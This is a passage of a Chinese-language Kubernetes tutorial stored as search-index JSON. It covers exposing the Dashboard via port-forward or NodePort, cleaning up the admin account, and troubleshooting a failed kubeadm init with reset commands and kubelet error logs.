\u200b\u662f\u200b\u4e00\u79cd\u200b\u4e34\u65f6\u6027\u200b\u7684\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff0c\u200b\u5b83\u200b\u5141\u8bb8\u200b\u4f60\u200b\u901a\u8fc7\u200b\u672c\u5730\u200b\u673a\u5668\u200b\u4e0a\u200b\u7684\u200b\u7aef\u53e3\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u96c6\u7fa4\u200b\u5185\u90e8\u200b\u7684\u200b\u670d\u52a1\u200b\u3002\u200b\u8fd9\u200b\u5bf9\u4e8e\u200b\u5f00\u53d1\u4eba\u5458\u200b\u6765\u8bf4\u200b\u975e\u5e38\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4ed6\u4eec\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u5916\u200b\u66b4\u9732\u200b\u670d\u52a1\u200b\u5373\u53ef\u200b\u8fdb\u884c\u200b\u8c03\u8bd5\u200b\u6216\u200b\u6d4b\u8bd5\u200b\u3002</p>"},{"location":"3/2/#6411","title":"6.4.1.1 \u200b\u5f00\u542f\u200b\u8bbf\u95ee","text":"<p>\u200b\u901a\u8fc7\u200b Port Forwarding \u200b\u8bbf\u95ee\u200b Dashboard\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u6267\u884c\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 8443:443\n</code></pre> <p>\u200b\u8fd9\u200b\u5c06\u200bDashboard\u200b\u5728\u200b https://localhost:8443 \u200b\u4e0a\u200b\u53ef\u7528\u200b\u3002</p>"},{"location":"3/2/#6412","title":"6.4.1.2 \u200b\u4f18\u70b9\u200b\u4e0e\u200b\u7f3a\u70b9","text":"<ul> <li> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u7684\u200b\u4f18\u70b9\u200b\u5728\u4e8e\u200b\u65b9\u6cd5\u200b\u7b80\u5355\u200b\u6613\u7528\u200b\uff0c\u200b\u65e0\u9700\u200b\u66f4\u6539\u200b\u4efb\u4f55\u200b\u96c6\u7fa4\u200b\u914d\u7f6e\u200b\uff0c\u200b\u9002\u5408\u200b\u5c0f\u89c4\u6a21\u200b\u6d4b\u8bd5\u200b\u6216\u200b\u4e2a\u4eba\u200b\u4f7f\u7528\u200b\u3002\u200b\u4f46\u200b\u4ec5\u9650\u4e8e\u200b\u6267\u884c\u547d\u4ee4\u200b\u7684\u200b\u672c\u5730\u200b\u673a\u5668\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e34\u65f6\u200b\u7684\u200b\uff0c\u200b\u5173\u95ed\u200b\u7ec8\u7aef\u200b\u540e\u200b\u8fde\u63a5\u200b\u5373\u200b\u65ad\u5f00\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5728\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u4e0a\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6bcf\u6b21\u200b\u4f7f\u7528\u200b\u65f6\u200b\u90fd\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5f00\u542f\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</p> </li> <li> <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u5728\u200b\u96c6\u7fa4\u200b\u5916\u90e8\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u6b64\u200b\u65b9\u6848\u200b\u4e0d\u200b\u9002\u5408\u200b\u672c\u6b21\u200b\uff08\u200b\u96c6\u7fa4\u200b\u5916\u200b\u8bbf\u95ee\u200b\uff09\u200b\u5b9e\u9645\u200b\u8bbf\u95ee\u200b\u573a\u666f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8c03\u6574\u200b\u91c7\u7528\u200b\u5176\u4ed6\u200b\u65b9\u6848\u200b</p> </li> </ul>"},{"location":"3/2/#642-nodeport","title":"6.4.2 \u200b\u65b9\u5f0f\u200b\u4e8c\u200b\uff1a\u200b\u4fee\u6539\u200b\u670d\u52a1\u7c7b\u578b\u200b\u4e3a\u200b NodePort","text":""},{"location":"3/2/#6421","title":"6.4.2.1 \u200b\u65b9\u6cd5\u200b\u6982\u8ff0","text":"<ul> <li> <p>NodePort \u200b\u5141\u8bb8\u200b Kubernetes \u200b\u670d\u52a1\u200b\u5728\u200b\u5404\u4e2a\u200b\u96c6\u7fa4\u200b\u8282\u70b9\u200b\u7684\u200b\u7279\u5b9a\u200b\u7aef\u53e3\u200b\u4e0a\u200b\u5bf9\u5916\u200b\u66b4\u9732\u200b\u3002\u200b\u8fd9\u200b\u4f7f\u5f97\u200b\u7528\u6237\u200b\u80fd\u591f\u200b\u901a\u8fc7\u200b\u4efb\u610f\u200b\u8282\u70b9\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b\u6307\u5b9a\u200b NodePort \u200b\u8fdb\u884c\u200b\u8bbf\u95ee\u200b Dashboard\u3002\uff08\u200b\u8303\u56f4\u200b\u901a\u5e38\u200b\u662f\u200b 30000-32767\uff09\uff0c\u200b\u4ece\u800c\u200b\u5141\u8bb8\u200b\u5916\u90e8\u200b\u6d41\u91cf\u200b\u901a\u8fc7\u200b\u8be5\u200b\u7aef\u53e3\u200b\u8fdb\u5165\u200b\u96c6\u7fa4\u200b\u5e76\u200b\u8bbf\u95ee\u200b\u6307\u5b9a\u200b\u7684\u200b\u670d\u52a1\u200b\u3002</p> </li> <li> <p>\u200b\u4e5f\u200b\u5c31\u662f\u200b\u652f\u6301\u200b\u96c6\u7fa4\u200b\u5916\u90e8\u200b\u8bbf\u95ee\u200b</p> </li> </ul>"},{"location":"3/2/#6422","title":"6.4.2.2 \u200b\u5f00\u542f\u200b\u8bbf\u95ee","text":"<p>\u200b\u7f16\u8f91\u200b Dashboard \u200b\u7684\u200b\u670d\u52a1\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5c06\u200b\u5176\u200b\u7c7b\u578b\u200b\u66f4\u200b\u6539\u4e3a\u200b NodePort\uff1a</p> Bash<pre><code>root@k8s-master01:~# kubectl patch svc kubernetes-dashboard-kong-proxy -n kubernetes-dashboard --type='json' -p '[{\"op\":\"replace\",\"path\":\"/spec/type\",\"value\":\"NodePort\"}]'\n# TODO \u200b\u82e5\u200b\u9700\u8981\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b nodePort\uff1a\nroot@k8s-master01:~# kubectl patch svc kubernetes-dashboard-kong-proxy -n kubernetes-dashboard --type='json' -p '[{\"op\":\"add\",\"path\":\"/spec/ports/0/nodePort\",\"value\":30000}]'\n</code></pre> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u5b9e\u9645\u64cd\u4f5c\u200b\u53ca\u200b\u7ed3\u679c\u200b\uff1a</p> Bash<pre><code>root@k8s-master01:~# kubectl patch svc kubernetes-dashboard-kong-proxy -n kubernetes-dashboard --type='json' -p '[{\"op\":\"replace\",\"path\":\"/spec/type\",\"value\":\"NodePort\"}]'\n\nservice/kubernetes-dashboard-kong-proxy patched\nroot@k8s-master01:~# kubectl get svc -A\n\nNAMESPACE              NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGE\ncalico-apiserver       calico-api                             ClusterIP   10.109.219.68    &lt;none&gt;        443/TCP                  21h\ncalico-system          calico-kube-controllers-metrics        ClusterIP   None             &lt;none&gt;        9094/TCP                 20h\ncalico-system          calico-typha                           ClusterIP   10.104.149.150   &lt;none&gt;        5473/TCP                 21h\ndefault                kubernetes                             ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  23h\ndefault                nginxweb-service                       NodePort    10.106.65.218    &lt;none&gt;        80:30080/TCP             19h\nkube-system            kube-dns                               ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   23h\nkubernetes-dashboard   kubernetes-dashboard-api               ClusterIP   10.104.42.174    &lt;none&gt;        8000/TCP                 128m\nkubernetes-dashboard   kubernetes-dashboard-auth              ClusterIP   10.98.125.185    &lt;none&gt;        8000/TCP                 128m\nkubernetes-dashboard   kubernetes-dashboard-external          NodePort    10.101.246.117   &lt;none&gt;        443:30011/TCP            7m8s\nkubernetes-dashboard   kubernetes-dashboard-kong-proxy        NodePort    10.110.23.250    &lt;none&gt;        443:31094/TCP            128m\nkubernetes-dashboard   kubernetes-dashboard-metrics-scraper   ClusterIP   10.102.211.164   &lt;none&gt;        8000/TCP                 128m\nkubernetes-dashboard   kubernetes-dashboard-web               ClusterIP   10.107.236.126   &lt;none&gt;        8000/TCP                 128m\n\n# \u200b\u76f8\u5173\u200b\u7684\u200b\u547d\u4ee4\u200b1\nroot@k8s-master01:~# kubectl get svc -A | grep dash\n\nkubernetes-dashboard   kubernetes-dashboard-api               ClusterIP   10.104.42.174    &lt;none&gt;        8000/TCP                 166m\nkubernetes-dashboard   kubernetes-dashboard-auth              ClusterIP   10.98.125.185    &lt;none&gt;        8000/TCP                 166m\nkubernetes-dashboard   kubernetes-dashboard-external          NodePort    10.101.246.117   &lt;none&gt;        443:30011/TCP            44m\nkubernetes-dashboard   kubernetes-dashboard-kong-proxy        NodePort    10.110.23.250    &lt;none&gt;        443:31094/TCP            166m\nkubernetes-dashboard   kubernetes-dashboard-metrics-scraper   ClusterIP   10.102.211.164   &lt;none&gt;        8000/TCP                 166m\nkubernetes-dashboard   kubernetes-dashboard-web               ClusterIP   10.107.236.126   &lt;none&gt;        8000/TCP                 166m\n\n# \u200b\u76f8\u5173\u200b\u7684\u200b\u547d\u4ee4\u200b2\nroot@k8s-master01:~# kubectl get svc -A -n kubernetes-dashboard\n\nNAMESPACE              NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGE\ncalico-apiserver       calico-api                             ClusterIP   10.109.219.68    &lt;none&gt;        443/TCP                  21h\ncalico-system          calico-kube-controllers-metrics        ClusterIP   None             &lt;none&gt;        9094/TCP                 21h\ncalico-system          calico-typha                           ClusterIP   10.104.149.150   &lt;none&gt;        5473/TCP                 21h\ndefault                kubernetes                             ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  24h\ndefault                nginxweb-service                       NodePort    10.106.65.218    &lt;none&gt;        80:30080/TCP             20h\nkube-system            kube-dns                               ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   24h\nkubernetes-dashboard   kubernetes-dashboard-api               ClusterIP   10.104.42.174    &lt;none&gt;        8000/TCP                 165m\nkubernetes-dashboard   kubernetes-dashboard-auth              ClusterIP   10.98.125.185    &lt;none&gt;        8000/TCP                 165m\nkubernetes-dashboard   kubernetes-dashboard-external          NodePort    10.101.246.117   &lt;none&gt;        443:30011/TCP            44m\nkubernetes-dashboard   kubernetes-dashboard-kong-proxy        NodePort    10.110.23.250    &lt;none&gt;        443:31094/TCP            165m\nkubernetes-dashboard   kubernetes-dashboard-metrics-scraper   ClusterIP   10.102.211.164   &lt;none&gt;        8000/TCP                 165m\nkubernetes-dashboard   kubernetes-dashboard-web               ClusterIP   10.107.236.126   &lt;none&gt;        8000/TCP                 165m\n</code></pre> <p>\u200b\u5982\u679c\u200b\u663e\u793a\u200b\u60a8\u200b\u7684\u200b\u8fde\u63a5\u200b\u4e0d\u662f\u200b\u79c1\u5bc6\u200b\u8fde\u63a5\u200b\uff0c\u200b\u5728\u200b\u5f53\u524d\u200b\u9875\u9762\u200b\u7528\u200b\u952e\u76d8\u8f93\u5165\u200bthisisunsafe,\u200b\u4e0d\u662f\u200b\u5728\u200b\u5730\u5740\u680f\u200b\u8f93\u5165\u200b\uff0c\u200b\u5c31\u200b\u76f4\u63a5\u200b\u8f93\u5165\u200b\uff0c\u200b\u9875\u9762\u200b\u5373\u4f1a\u200b\u81ea\u52a8\u200b\u5237\u65b0\u200b\u8fdb\u5165\u200b\u7f51\u9875\u200b\u3002\u200b\u4e0d\u884c\u200b\u5c31\u200b\u591a\u200b\u8f93\u5165\u200b\u51e0\u6b21\u200b\uff0c\u200b\u4f46\u662f\u200b\u8981\u200b\u786e\u4fdd\u200b\u8f93\u5165\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\u3002\u200b\u5177\u4f53\u200b\u8bf7\u200b\u67e5\u770b\u200b\u8fd9\u7bc7\u200b\u535a\u5ba2\u200b</p>"},{"location":"3/2/#6424-kubernetes-dashboard-web","title":"6.4.2.4 \u200b\u8bbf\u95ee\u200bKubernetes Dashboard Web\u200b\u9875\u9762","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u968f\u673a\u200b\u5f00\u653e\u200b\u4e86\u200b31094\u200b\u7aef\u53e3\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u6253\u5f00\u200b https://192.168.11.161:31094 \u200b\u6d4b\u8bd5\u200b\uff08\u200b\u5ffd\u7565\u200b\u4e0d\u662f\u200b\u79c1\u5bc6\u200b\u8fde\u63a5\u200b\u7684\u200b\u63d0\u793a\u200b\u540e\u200b\uff09\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u6253\u5f00\u200b\uff0c\u200b\u8f93\u5165\u200btoken\u200b\u540e\u200b\u80fd\u591f\u200b\u6b63\u5e38\u200b\u767b\u5f55\u200b\u3002</p> <p></p> <p></p>"},{"location":"3/2/#6425","title":"6.4.2.5 \u200b\u4f18\u70b9\u200b\u4e0e\u200b\u7f3a\u70b9","text":"<ul> <li> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u4e00\u65e6\u200b\u914d\u7f6e\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ea\u8981\u200b\u96c6\u7fa4\u200b\u5b58\u5728\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6301\u7eed\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u957f\u671f\u200b\u7a33\u5b9a\u200b\u7684\u200b\u8bbf\u95ee\u200b\u9014\u5f84\u200b\uff1b\u200b\u540c\u65f6\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u4efb\u610f\u200b\u8282\u70b9\u200b IP \u200b\u52a0\u4e0a\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u53f7\u200b\u6765\u200b\u8bbf\u95ee\u200b\u670d\u52a1\u200b\uff0c\u200b\u6613\u4e8e\u200b\u8bbf\u95ee\u200b\u3002</p> </li> <li> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u5b83\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\uff0c\u200b\u5982\u679c\u200b\u672a\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b\u9632\u706b\u5899\u200b\u89c4\u5219\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u670d\u52a1\u200b\u88ab\u200b\u672a\u7ecf\u200b\u6388\u6743\u200b\u7684\u200b\u4eba\u200b\u8bbf\u95ee\u200b\uff1b</p> </li> <li> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u672a\u200b\u88ab\u200b\u5360\u7528\u200b\u7684\u200b\u7aef\u53e3\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6709\u200b\u4e00\u5b9a\u200b\u7684\u200b\u7aef\u53e3\u200b\u9650\u5236\u200b\u3002</p> </li> </ul>"},{"location":"3/2/#6426","title":"6.4.2.6 \u200b\u53c2\u8003\u8d44\u6599","text":"<ul> <li>kubernetes-dashboard-7.11.1/README.md</li> <li>\u200b\u8bbf\u95ee\u200b\u4eea\u8868\u677f\u200b</li> <li>69.Kubernetes(k8s)\u200b\u624b\u628a\u624b\u200b\u6559\u7a0b\u200b\u2014\u200b\u90e8\u7f72\u200bDashboard\u200b\u4ee5\u200b\u56fe\u5f62\u5316\u200b\u65b9\u5f0f\u200b\u7ba1\u7406\u200bKubernetes</li> <li>Kubernetes(k8s) Web-UI\u200b\u754c\u9762\u200b(\u200b\u4e00\u200b)\uff1a\u200b\u90e8\u7f72\u200b\u548c\u200b\u8bbf\u95ee\u200b\u4eea\u8868\u677f\u200b(Dashboard)</li> <li>\u200b\u4e8c\u8fdb\u5236\u200b\u5b89\u88c5\u200bKubernetes\uff08k8s\uff09v1.32.0</li> </ul>"},{"location":"3/2/#65","title":"6.5 \u200b\u6e05\u7406\u200b\u548c\u200b\u540e\u7eed\u200b\u6b65\u9aa4","text":"<p>\u200b\u5220\u9664\u200b\u7ba1\u7406\u5458\u200bServiceAccount\u200b\u548c\u200bClusterRoleBinding\u3002</p> Bash<pre><code>root@k8s-master01:~# kubectl -n kubernetes-dashboard delete serviceaccount admin-user\nroot@k8s-master01:~# kubectl -n kubernetes-dashboard delete clusterrolebinding admin-user\n</code></pre> <p>\u200b\u4e86\u89e3\u200b\u6709\u5173\u200b\u5982\u4f55\u200b\u5728\u200b Kubernetes \u200b\u4e2d\u200b\u6388\u4e88\u200b/\u200b\u62d2\u7edd\u200b\u6743\u9650\u200b\u7684\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u9605\u8bfb\u200b\u5b98\u65b9\u200b\u8eab\u4efd\u9a8c\u8bc1\u200b\u548c\u200b\u6388\u6743\u200b\u6587\u6863\u200b\u3002</p>"},{"location":"3/2/#_6","title":"\u4e03\u200b\u3001 \u200b\u5b9e\u9645\u200b\u90e8\u7f72\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u9047\u5230\u200b\u7684\u200b\u95ee\u9898","text":""},{"location":"3/2/#711","title":"7.1.1\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u91cd\u542f\u200b\u540e\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b\u539f\u200b\u8d26\u6237\u200b\u767b\u5f55","text":""},{"location":"3/2/#712-kubeadm","title":"7.1.2 kubeadm\u200b\u521d\u59cb\u5316\u200b\u5931\u8d25\u200b\uff0c\u200b\u629b\u51fa\u200b\u9519\u8bef","text":""},{"location":"3/2/#713-kubelet","title":"7.1.3 \u200b\u5b89\u88c5\u200b\u5982\u200b\u9047\u5230\u200b\u9519\u8bef\u200b\uff0c\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5173\u95ed\u200bkubelet","text":"Bash<pre><code>~# sudo rm -rf /etc/kubernetes/manifests/kube-apiserver.yaml\n~# sudo rm -rf /etc/kubernetes/manifests/kube-controller-manager.yaml\n~# sudo rm -rf /etc/kubernetes/manifests/kube-scheduler.yaml\n~# sudo rm -rf /etc/kubernetes/manifests/etcd.yaml\n\n~# sudo rm -rf /etc/kubernetes/manifests/kube-apiserver.yaml &amp;&amp; sudo rm -rf /etc/kubernetes/manifests/kube-controller-manager.yaml &amp;&amp; sudo rm -rf /etc/kubernetes/manifests/kube-scheduler.yaml &amp;&amp; sudo rm -rf /etc/kubernetes/manifests/etcd.yaml\n\nsudo netstat -tulnp | grep :10250\nsudo lsof -i :10250\n\nsudo kill 2832\nsudo kill -9 1234\n\n~# systemctl status kubelet\n~# systemctl stop kubelet\n</code></pre>"},{"location":"3/2/#7132-kubernetes","title":"7.1.3.2 \u200b\u91cd\u65b0\u200b\u521d\u59cb\u5316\u200b Kubernetes \u200b\u96c6\u7fa4","text":"<ul> <li>\u200b\u6b65\u9aa4\u200b 1\uff1a\u200b\u91cd\u7f6e\u200b kubeadm\\2\uff1a\u200b\u6e05\u7406\u200b\u6b8b\u7559\u200b\u6587\u4ef6\u200b</li> </ul> Bash<pre><code>~# sudo kubeadm reset -f &amp;&amp; sudo rm -rf /etc/kubernetes /var/lib/etcd /var/lib/kubelet\n</code></pre> <ul> <li>https://blog.csdn.net/m0_51510236/article/details/136329885</li> </ul> Bash<pre><code>root@k8s-master01:~# sudo kubeadm init \\\n--apiserver-advertise-address=192.168.11.161 \\\n--apiserver-cert-extra-sans=k8s-master01 \\\n--image-repository=registry.aliyuncs.com/google_containers \\\n--kubernetes-version=v1.32.3 \\\n--service-cidr=10.96.0.0/12 \\\n--pod-network-cidr=10.244.0.0/16 \\\n--cri-socket=unix:///run/containerd/containerd.sock \\\n--cgroup-driver=systemd \\\n--upload-certs \\\n--v=9\n</code></pre> Bash<pre><code>Mar 22 13:26:21 k8s-master01 kubelet[9760]: E0322 13:26:21.545465    9760 pod_workers.go:1301] \"Error syncing pod, skipping\" err=\"failed to \\\"CreatePodSandbox\\\" for \\\"kube-controller-manager-k8s-master01_kube-system(19dfb154dd163834eef61b7252703fed)\\\" with CreatePodSandboxError: \\\"Failed to create sandbox for pod \\\\\\\"kube-controller-manager-k8s-master01_kube-system(19dfb154dd163834eef61b7252703fed)\\\\\\\": rpc error: code = Unknown desc = failed to start sandbox \\\\\\\"623e76469b34076613d313938932728b1c6e63d0951c4c1a1a7563332c35b2e2\\\\\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/623e76469b34076613d313938932728b1c6e63d0951c4c1a1a7563332c35b2e2/log.json: no such file or directory): exec: \\\\\\\"runc\\\\\\\": executable file not found in $PATH\\\"\" pod=\"kube-system/kube-controller-manager-k8s-master01\" podUID=\"19dfb154dd163834eef61b7252703fed\"\nMar 22 13:26:23 k8s-master01 kubelet[9760]: E0322 13:26:23.120378    9760 controller.go:145] \"Failed to ensure lease exists, will retry\" err=\"Get \\\"https://192.168.11.161:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/k8s-master01?timeout=10s\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" interval=\"7s\"\nMar 22 13:26:23 k8s-master01 kubelet[9760]: I0322 13:26:23.327532    9760 kubelet_node_status.go:75] \"Attempting to register node\" node=\"k8s-master01\"\nMar 22 13:26:23 k8s-master01 kubelet[9760]: E0322 13:26:23.328029    9760 kubelet_node_status.go:107] \"Unable to register node with API server\" err=\"Post \\\"https://192.168.11.161:6443/api/v1/nodes\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" node=\"k8s-master01\"\nMar 22 13:26:25 k8s-master01 kubelet[9760]: W0322 13:26:25.039914    9760 reflector.go:569] k8s.io/client-go/informers/factory.go:160: failed to list *v1.CSIDriver: Get \"https://192.168.11.161:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&amp;resourceVersion=0\": dial tcp 192.168.11.161:6443: connect: connection refused\nMar 22 13:26:25 k8s-master01 kubelet[9760]: E0322 13:26:25.040030    9760 reflector.go:166] \"Unhandled Error\" err=\"k8s.io/client-go/informers/factory.go:160: Failed to watch *v1.CSIDriver: failed to list *v1.CSIDriver: Get \\\"https://192.168.11.161:6443/apis/storage.k8s.io/v1/csidrivers?limit=500&amp;resourceVersion=0\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" logger=\"UnhandledError\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: W0322 13:26:26.039053    9760 reflector.go:569] k8s.io/client-go/informers/factory.go:160: failed to list *v1.Service: Get \"https://192.168.11.161:6443/api/v1/services?fieldSelector=spec.clusterIP%21%3DNone&amp;limit=500&amp;resourceVersion=0\": dial tcp 192.168.11.161:6443: connect: connection refused\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.039171    9760 reflector.go:166] \"Unhandled Error\" err=\"k8s.io/client-go/informers/factory.go:160: Failed to watch *v1.Service: failed to list *v1.Service: Get \\\"https://192.168.11.161:6443/api/v1/services?fieldSelector=spec.clusterIP%21%3DNone&amp;limit=500&amp;resourceVersion=0\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" logger=\"UnhandledError\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.450839    9760 kubelet.go:3190] \"No need to create a mirror pod, since failed to get node info from the cluster\" err=\"node \\\"k8s-master01\\\" not found\" node=\"k8s-master01\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.451717    9760 dns.go:153] \"Nameserver limits exceeded\" err=\"Nameserver limits were exceeded, some nameservers have been omitted, the applied nameserver line is: 119.29.29.29 114.114.114.114 8.8.8.8\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.547499    9760 log.go:32] \"RunPodSandbox from runtime service failed\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.547575    9760 kuberuntime_sandbox.go:72] \"Failed to create sandbox for pod\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\" pod=\"kube-system/kube-apiserver-k8s-master01\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.547611    9760 kuberuntime_manager.go:1237] \"CreatePodSandbox for pod failed\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\" pod=\"kube-system/kube-apiserver-k8s-master01\"\nMar 22 13:26:26 k8s-master01 kubelet[9760]: E0322 13:26:26.547680    9760 pod_workers.go:1301] \"Error syncing pod, skipping\" err=\"failed to \\\"CreatePodSandbox\\\" for \\\"kube-apiserver-k8s-master01_kube-system(843638c9eef6e3d63d22d53c9d990887)\\\" with CreatePodSandboxError: \\\"Failed to create sandbox for pod \\\\\\\"kube-apiserver-k8s-master01_kube-system(843638c9eef6e3d63d22d53c9d990887)\\\\\\\": rpc error: code = Unknown desc = failed to start sandbox \\\\\\\"c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54\\\\\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c54802a9d762ba695f68d28021ea9339eb8e9845d41161d6fa1f9bfb4d811c54/log.json: no such file or directory): exec: \\\\\\\"runc\\\\\\\": executable file not found in $PATH\\\"\" pod=\"kube-system/kube-apiserver-k8s-master01\" podUID=\"843638c9eef6e3d63d22d53c9d990887\"\nMar 22 13:26:29 k8s-master01 kubelet[9760]: E0322 13:26:29.498553    9760 eviction_manager.go:292] \"Eviction manager: failed to get summary stats\" err=\"failed to get node info: node \\\"k8s-master01\\\" not found\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.122192    9760 controller.go:145] \"Failed to ensure lease exists, will retry\" err=\"Get \\\"https://192.168.11.161:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/k8s-master01?timeout=10s\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" interval=\"7s\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: I0322 13:26:30.329597    9760 kubelet_node_status.go:75] \"Attempting to register node\" node=\"k8s-master01\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.330070    9760 kubelet_node_status.go:107] \"Unable to register node with API server\" err=\"Post \\\"https://192.168.11.161:6443/api/v1/nodes\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" node=\"k8s-master01\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.450085    9760 kubelet.go:3190] \"No need to create a mirror pod, since failed to get node info from the cluster\" err=\"node \\\"k8s-master01\\\" not found\" node=\"k8s-master01\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.450964    9760 dns.go:153] \"Nameserver limits exceeded\" err=\"Nameserver limits were exceeded, some nameservers have been omitted, the applied nameserver line is: 119.29.29.29 114.114.114.114 8.8.8.8\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.548988    9760 log.go:32] \"RunPodSandbox from runtime service failed\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\"\nMar 22 